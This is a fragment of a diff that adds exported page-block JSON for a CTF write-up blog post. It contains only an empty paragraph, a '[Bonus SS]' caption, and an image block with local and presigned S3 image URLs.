+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-818a-a04f-f7ccd4f7648a",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "[Bonus SS]",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8120-bb34-d3fadb255c84",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-25.png",
+          "expiry_time": "2025-09-18T02:37:21.346Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-25.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/c0ac57f9-3c1e-4098-b445-ddfba4ba1253/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=16bd01b8066cc6d0ef29785850e7b3212391af6c39b63991b1260145b46600a0&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      }
+    ],
+    "og_image": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-1.png",
+    "featured_image": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-1.png"
+  }
+}
